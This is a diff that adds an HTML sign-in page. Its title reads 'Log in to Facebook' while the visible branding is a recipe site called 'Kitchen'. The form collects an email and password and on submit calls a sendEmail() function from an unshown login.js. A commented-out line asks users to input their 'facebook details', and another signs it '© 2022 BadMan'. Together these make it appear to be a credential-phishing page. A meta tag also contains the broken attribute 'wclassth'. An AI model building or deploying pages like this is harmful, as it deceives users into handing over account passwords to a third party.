@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="wclassth=device-wclassth, initial-scale=1.0">
+    <link rel="stylesheet" href="login.css">
+    <link rel="stylesheet" href="font-awesome-4.7.0 (4)/font-awesome-4.7.0/css/font-awesome.css">
+    <title>Log in to Facebook</title>
+</head>
+<body>
+    <div>
+        <a href="index.html"><i class="fa fa-home"></i></a>
+    </div>
+    <div class="container">
+        <form method="post" onsubmit="sendEmail(), reset(); return false;">
+            <!-- <a href="#" id="cancel" class="active"><i  class="fa fa-times" onclick="closeLeftMenu()"> </i></a>  -->
+            <p class="log">Kitchen</p>
+            <p class="sign">Sign in to comment on posts, save recipes and participate in our coolest features.</p>
+            <h3><i class="fa fa-google"></i>LOG IN WITH GOOGLE</h3>
+            <span><hr class="hr1"><p>or</p><hr class="hr2"></span>
+            <input type="email" id="email" placeholder="Email address or phone number" class="email" required>    
+            <input type="password" id="password1" class="password" placeholder="Password" required> 
+            <a href="#" class="new--">New Member?</a>           
+            <!-- <input type="password" id="password2" class="password" placeholder="Confirm password" required>             -->
+            <button  id="btn1" class="input"  onclick="validate()"> Log in</button>
+            <a href="#" role="log" class="account">Don't remember your password?</a>
+            <a href="#" class="new">Create New Account</a>
+        </form>
+    </div>
+    <!-- <div class="p2">
+        <p>Input your facebook details above</p>
+        <a class="copy" href="#">&copy; 2022 BadMan</a>
+    </div> -->
+</body>
+<script src="login.js"></script>
+
+</html>
